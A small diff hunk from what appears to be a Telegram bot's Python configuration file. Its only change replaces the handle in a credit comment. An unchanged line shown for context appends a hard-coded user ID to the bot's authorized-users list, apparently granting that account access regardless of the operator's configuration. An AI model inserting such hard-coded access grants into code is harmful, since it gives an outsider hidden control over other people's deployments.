@@ -9,7 +9,7 @@ from bot.config import Config
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
 AUTH_USERS.append(8108281129)
-# again lol (c) @cmd_rulf 
+# again lol (c) @Yae_X_Miko 
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
